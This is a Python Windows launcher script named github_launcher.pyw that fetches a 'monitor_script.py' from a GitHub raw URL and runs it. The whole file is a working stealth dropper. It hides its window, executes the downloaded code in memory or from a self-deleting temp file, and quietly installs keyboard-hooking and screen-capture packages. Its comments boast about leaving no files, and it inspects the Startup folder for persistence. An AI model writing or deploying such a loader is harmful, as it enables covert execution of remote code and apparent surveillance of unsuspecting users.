# github_launcher.pyw - Runs monitor script WITHOUT creating any files
import os
import sys
import subprocess
import urllib.request
import tempfile
import time

def run_from_memory():
    """Download and execute script directly from memory - NO files created"""
    try:
        # GitHub URL
        SCRIPT_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
        
        # Download script directly
        response = urllib.request.urlopen(SCRIPT_URL)
        script_code = response.read().decode('utf-8')
        
        # Check if we need to add auto-install
        if "import pywin32" in script_code and "def is_package_installed" not in script_code:
            # Add auto-install code at the beginning
            auto_install = '''
# Auto-install missing dependencies
import sys, subprocess, importlib.util

def install_package(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                      creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

required = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
for pkg in required:
    try:
        if pkg == "pillow":
            __import__("PIL")
        else:
            __import__(pkg)
    except ImportError:
        install_package(pkg)
'''
            script_code = auto_install + script_code
        
        # Execute directly from memory
        exec(script_code)
        
        return True
        
    except Exception:
        return False

def run_from_temp():
    """Alternative: Run from temp file that gets deleted immediately"""
    try:
        # GitHub URL
        SCRIPT_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
        
        # Download script
        response = urllib.request.urlopen(SCRIPT_URL)
        script_code = response.read().decode('utf-8')
        
        # Create temp file (will be deleted)
        temp_dir = tempfile.gettempdir()
        script_path = os.path.join(temp_dir, "monitor_temp.py")
        
        # Add auto-install
        if "def is_package_installed" not in script_code:
            auto_install = '''
import sys, subprocess, importlib.util

def install(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                      creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

for pkg in ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]:
    try:
        __import__(pkg if pkg != "pillow" else "PIL")
    except ImportError:
        install(pkg)
'''
            script_code = auto_install + script_code
        
        # Write to temp file
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Run completely hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, script_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Schedule deletion of temp file
        def delete_temp():
            time.sleep(5)
            try:
                os.remove(script_path)
            except:
                pass
        
        import threading
        threading.Thread(target=delete_temp, daemon=True).start()
        
        return True
        
    except Exception:
        return False

def ensure_no_files_in_startup():
    """Make sure startup folder doesn't have unwanted files"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Check what's there but don't delete anything
        # (The monitor script will handle deletion)
        files = os.listdir(startup_folder)
        
        # Count unwanted files
        unwanted = 0
        for f in files:
            if f.endswith(('.log', '.txt', '.json', '.py', '.pyc')) and f not in ['Startup.pyw', 'github_launcher.pyw']:
                unwanted += 1
        
        if unwanted > 0:
            # The monitor script will clean these up
            pass
            
    except:
        pass

def main():
    """Main launcher - completely clean, no file creation"""
    # Hide console if possible
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass
    
    # Check startup folder (just for info)
    ensure_no_files_in_startup()
    
    # Wait for network
    time.sleep(5)
    
    # Try to run from memory first (cleanest)
    if not run_from_memory():
        # Fallback to temp file method
        run_from_temp()
    
    # Keep launcher alive but idle
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
